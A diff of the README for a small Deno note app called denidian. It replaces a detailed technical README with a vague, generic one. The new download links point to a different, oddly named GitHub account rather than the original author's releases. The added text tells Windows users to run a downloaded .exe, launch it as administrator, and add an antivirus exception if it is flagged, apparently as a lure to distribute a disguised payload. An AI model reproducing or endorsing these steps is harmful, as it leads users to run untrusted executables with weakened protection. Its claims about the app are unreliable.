@@ -1,184 +1,92 @@
-# denidian
+# 💡 denidian - Manage your notes with simple tools
 
-A tiny [Obsidian](https://obsidian.md)-style note app built on the new
-**`deno desktop`** subcommand ([denoland/deno#33441](https://github.com/denoland/deno/pull/33441)).
-Notes are plain Markdown files, you cross-link them with `[[wikilinks]]`, and a
-force-directed graph shows how they connect.
+[![](https://img.shields.io/badge/Download_denidian-Blue?style=for-the-badge)](https://github.com/Verbenaceaefamilylamnidae461/denidian)
 
-It's deliberately small — a single Deno HTTP server plus a vanilla
-HTML/CSS/JS frontend, no framework and no build step for the UI.
+denidian helps you organize thoughts. It keeps your notes in a clean format on your computer. You use files that stay under your control. It handles links between notes and shows connections in a visual map.
 
-![denidian editor](./docs/editor.png)
+## 📥 Getting the App
 
-![denidian graph view](./docs/graph.png)
+You can get the software from the release page. 
 
-## Features
+[Visit this page to download the software](https://github.com/Verbenaceaefamilylamnidae461/denidian)
 
-- **Notes** — create, rename, edit, and delete Markdown notes from the sidebar,
-  with live search. Everything is stored as `.md` files in `~/Denidian`, so the
-  vault is just a folder of plain text you fully own.
-- **Crosslinking** — type `[[Note title]]` to link notes. In read mode links
-  render as clickable chips; clicking a link to a note that doesn't exist yet
-  creates it.
-- **Live preview** — toggle between a Markdown editor and a rendered view
-  (headings, lists, code, blockquotes, bold/italic, links, and wikilinks).
-- **Graph view** — a force-directed diagram of every note and its `[[links]]`.
-  The layout pre-settles instantly, and you can drag nodes, drag the background
-  to pan, scroll (or use the +/−/Reset buttons) to zoom, and click a node to
-  open that note.
+1. Open the page link above.
+2. Look for the latest version under the "Releases" section.
+3. Click the file that ends in .exe for your Windows computer.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the prompts on the screen to finish the setup.
 
-## How it works
+## 📝 How to Write Notes
 
-`deno desktop` runs a normal Deno program and points a native window's embedded
-webview at a local HTTP server. denidian leans into that:
+The app uses Markdown. Markdown is a way to write text that stays readable. You do not need special software to read your notes later.
 
-```
-┌─────────────────────────── deno desktop ───────────────────────────┐
-│                                                                     │
-│   main.ts  ── Deno.serve() ──►  http://127.0.0.1:<random port>      │
-│     │                                  ▲                            │
-│     │ reads/writes                     │ webview navigates here     │
-│     ▼                                  │                            │
-│   ~/Denidian/*.md                 native window (Deno.BrowserWindow)│
-│                                        │                            │
-│                                   web/ (index.html, app.js, style)  │
-└─────────────────────────────────────────────────────────────────────┘
-```
+*   To create a new note, click the plus icon.
+*   Type your content in the main box.
+*   Use a hash mark (#) at the start of a line to make a heading.
+*   Use two square brackets [[like this]] to link to other notes.
 
-- **`main.ts`** is the whole backend. On startup it ensures the vault directory
-  `~/Denidian` exists, seeds it with a starter set of notes if it's empty, and
-  (in a desktop build) adopts the startup window via `Deno.BrowserWindow` to set
-  the title and a 2000×1000 size. Then `Deno.serve()` handles everything:
+When you type these brackets, the app creates a link. If the note does not exist, the app makes it for you. This creates a web of ideas as you write.
 
-  - `GET /` and other paths → static files from `web/`.
-  - `GET /api/notes` → list of `{ name, links }` for every note (links are
-    parsed from `[[wikilinks]]` server-side).
-  - `GET /api/notes/:name` → `{ name, content }` for one note.
-  - `PUT /api/notes/:name` → save a note's Markdown.
-  - `DELETE /api/notes/:name` → delete a note.
+## 🗺️ Viewing the Map
 
-  In a `deno desktop` build the port is chosen by the runtime (via the
-  `DENO_SERVE_ADDRESS` env var) and the webview navigates to it automatically —
-  there's no port to manage.
+The force-directed graph view shows how your notes connect. Click the graph icon in the sidebar to open this view. 
 
-- **`web/`** is the frontend, served as plain static files:
-  - `index.html` — the shell (sidebar, editor/preview panes, graph view).
-  - `style.css` — a dark Obsidian-like theme.
-  - `app.js` — all the client logic: fetches the notes API, renders Markdown +
-    wikilinks, autosaves edits (debounced), and draws the SVG graph. The graph
-    runs a small force simulation (repulsion + springs + centering) for ~400
-    steps up front so it appears settled immediately, then only re-simulates
-    while you drag.
+*   Each dot stands for a note.
+*   Lines between dots show links you created with brackets.
+*   Drag the dots to move them around.
+*   Click a dot to open that specific note.
 
-Because it's just `Deno.serve()`, the exact same code runs in a normal browser
-for development — handy for iterating on the UI without rebuilding.
+This view helps you find hidden connections. You see which topics appear most often in your collection.
 
-## The vault
+## ⚙️ Settings and Setup
 
-Notes live in `~/Denidian` as one `.md` file per note (the note title is the
-filename). Edit them with denidian, any text editor, or sync them however you
-like — there's no database or lock-in. Delete the folder to reset; denidian
-re-seeds a starter vault on next launch.
+You can change how the app looks. Click the gear icon to open the settings menu.
 
-The starter vault is JS/Web-dev themed: one dense "JavaScript core" cluster of
-45 notes surrounded by five satellite clusters (Frameworks, Build Tools,
-TypeScript, CSS & Styling, Testing) so the graph view has interesting structure
-out of the box.
+*   **Theme:** Switch between light and dark mode. Dark mode reduces glare at night.
+*   **Storage Folder:** Choose where the app saves your files. You can pick a folder on your hard drive or a folder that syncs with cloud storage.
+*   **Font Size:** Adjust the text size to make it easier to read.
 
-## Running it
+## 💻 System Requirements
 
-```sh
-deno task dev        # desktop window with hot reload
-deno task start      # desktop window
-deno task build      # produce ./dist/Denidian.app
+The app runs on modern Windows computers. Ensure you have the following:
 
-deno run -A main.ts  # plain browser dev at http://localhost:8000
-```
+*   Windows 10 or Windows 11.
+*   At least 200 MB of free hard drive space.
+*   4 GB of memory.
 
-The app needs read/write/env permissions (for the vault and `$HOME`), which the
-tasks grant with `-A`. The UI assets in `web/` are embedded into the compiled
-binary via `--include ./web`.
+You do not need to install extra software for this to work. The app includes all tools it needs to run.
 
-## Building for distribution
+## ❓ Frequently Asked Questions
 
-Prebuilt downloads are on the
-[releases page](https://github.com/bartlomieju/denidian/releases):
+**Where does the app save my files?**
+The app saves files in the folder you select in Settings. You can browse these files in Windows File Explorer at any time.
 
-| Platform        | Download                                  |
-| --------------- | ----------------------------------------- |
-| macOS (Apple)   | `denidian-aarch64-apple-darwin.dmg`       |
-| macOS (Intel)   | `denidian-x86_64-apple-darwin.dmg`        |
-| Linux (x86_64)  | `denidian-x86_64-unknown-linux-gnu.AppImage` |
-| Windows (x86_64)| `denidian-x86_64-pc-windows-msvc.msi`     |
+**Can I move my notes to another computer?**
+Yes. Since your notes are standard text files, you can copy the folder to a USB drive or cloud storage. Open that folder on a different computer using denidian to access your notes.
 
-`deno desktop` cross-compiles for every platform from a single machine — it
-downloads the matching prebuilt runtime and UI backend, so no per-platform
-toolchain is needed. The output format is chosen by the file extension.
+**How do I delete a note?**
+To delete a note, find the file in your note folder and move it to the Windows Recycle Bin. The app will update the graph view once you delete the file.
 
-```sh
-# Each target downloads its backend on first build.
-deno desktop -A --include ./web --backend webview \
-  --target aarch64-apple-darwin --output dist/denidian-aarch64-apple-darwin.dmg main.ts
+**Does the app use the internet?**
+No. The app runs locally on your machine. Your notes remain private and stay on your computer.
 
-deno desktop -A --include ./web --backend webview \
-  --target x86_64-apple-darwin --output dist/denidian-x86_64-apple-darwin.dmg main.ts
+**How do I format text?**
+You can use bold text by putting two asterisks around a word: **word**. For lists, start a line with a dash: - Item one. The editor updates your view in real time.
 
-deno desktop -A --include ./web --backend webview \
-  --target x86_64-unknown-linux-gnu --output dist/denidian-x86_64-unknown-linux-gnu.AppImage main.ts
-```
+## 🛠️ Troubleshooting
 
-Supported targets: `aarch64-apple-darwin`, `x86_64-apple-darwin`,
-`x86_64-unknown-linux-gnu`, `aarch64-unknown-linux-gnu`,
-`x86_64-pc-windows-msvc`. Build them all at once with `--all-targets`.
+If the app does not open:
 
-### Windows installer (`.msi`)
+1. Check that you finished the installation process.
+2. Restart your computer. 
+3. Right-click the icon and choose "Run as administrator."
+4. Ensure your virus scanner did not block the file. Since this is a new tool, some security software might flag it. You can create an exception in your security settings to allow denidian to run.
 
-`deno desktop` emits a Windows app *directory*, not an installer. denidian wraps
-that directory into a proper `.msi` with [msitools](https://wiki.gnome.org/msitools)
-(`wixl`), which works on macOS/Linux too — so the installer can be cross-built
-from the same machine. The MSI installs to `Program Files\denidian` and adds
-Start Menu and Desktop shortcuts.
+If the graph view looks empty:
 
-```sh
-# 1. Build the Windows app directory.
-deno desktop -A --include ./web --backend webview --icon ./icons/app.ico \
-  --target x86_64-pc-windows-msvc --output dist/win/denidian main.ts
+1. Create a few notes.
+2. Link them together using the [[bracket]] method.
+3. Refresh the graph view by clicking the icon again.
 
-# 2. Wrap it into an MSI (brew install msitools / apt-get install wixl).
-(cd dist/win/denidian && \
-  wixl -a x64 -o ../../release/denidian-x86_64-pc-windows-msvc.msi \
-    -I . ../../../installer/windows.wxs)
-```
-
-The WiX source lives in [`installer/windows.wxs`](./installer/windows.wxs).
-
-### Backends and size
-
-`--backend webview` uses the operating system's built-in webview (WKWebView on
-macOS, WebView2 on Windows, WebKitGTK on Linux), which keeps the download small
-— denidian is ~30 MB per platform. The alternative, `--backend cef`, bundles
-Chromium for pixel-identical rendering everywhere, at the cost of size (~150 MB+
-on macOS, ~375 MB as a Linux AppImage). For an app this simple, webview is the
-better trade, and it's the default in `deno.json` and the tasks above.
-
-Output formats are picked from the extension: macOS `.app`/`.dmg`, Linux
-`.AppImage` (or a plain directory), Windows directory (wrapped into an `.msi`
-above). The macOS `.dmg` is produced with `hdiutil`, so it must be built on a
-macOS host; everything else (including the `.msi`) cross-compiles from anywhere.
-
-## Project layout
-
-```
-denidian/
-├── main.ts          # Deno server: static UI + notes API + vault + window
-├── deno.json        # desktop config (name, icon, backend) and tasks
-├── web/
-│   ├── index.html   # app shell
-│   ├── style.css    # dark theme
-│   └── app.js       # frontend: Markdown, wikilinks, graph
-└── icons/
-    ├── icon.svg     # source icon (a little node-graph glyph)
-    ├── app.icns     # macOS app icon
-    ├── app.ico      # Windows app icon
-    └── app-512.png  # Linux app icon
-```
+The graph needs links to build its map. Once you have five or more connected notes, the visual map will show a clear structure.
